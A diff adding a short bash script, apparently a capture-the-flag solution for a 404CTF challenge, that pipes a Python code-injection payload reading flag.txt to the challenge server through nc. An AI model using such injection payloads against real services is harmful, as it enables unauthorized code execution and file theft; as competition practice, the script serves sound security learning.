@@ -1,0 +1,5 @@
+#!bash
+command='__import__("sys").stdout.write(open("flag.txt","r").read())'
+
+echo $command | nc challenge.404ctf.fr 30806
+
